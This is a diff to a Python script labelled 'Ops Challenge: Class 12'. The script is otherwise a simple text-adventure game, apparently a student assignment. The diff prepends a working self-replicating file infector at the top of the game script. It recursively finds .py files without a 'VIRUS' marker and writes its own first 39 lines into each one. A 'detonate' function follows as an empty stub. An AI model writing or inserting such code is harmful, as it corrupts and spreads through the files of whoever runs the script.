@@ -1,3 +1,42 @@
+#!/usr/bin/python3
+import os
+import datetime
+
+SIGNATURE = "VIRUS"
+
+def locate(path):
+    files_targeted = []
+    filelist = os.listdir(path)
+    for fname in filelist:
+        if os.path.isdir(path+"/"+fname):
+            files_targeted.extend(locate(path+"/"+fname))
+        elif fname[-3:] == ".py":
+            infected = False
+            for line in open(path+"/"+fname):
+                if SIGNATURE in line:
+                    infected = True
+                    break
+            if infected == False:
+                files_targeted.append(path+"/"+fname)
+    return files_targeted
+
+def infect(files_targeted):
+    virus = open(os.path.abspath(__file__))
+    virusstring = ""
+    for i,line in enumerate(virus):
+        if 0 <= i < 39:
+            virusstring += line
+    virus.close
+    for fname in files_targeted:
+        f = open(fname)
+        temp = f.read()
+        f.close()
+        f = open(fname,"w")
+        f.write(virusstring + temp)
+        f.close()
+
+def detonate():
+    
 # script: Ops Challenge: Class 12
 # Author:  Barbara L. Beaufort
 # Date of latest revision: 7/17/2023
@@ -37,5 +76,3 @@ while response not in directions:
         print("You made it out. Congratulations! " + name + ".")
     else:
         print("I didn't understand that.\n")
-    
-    
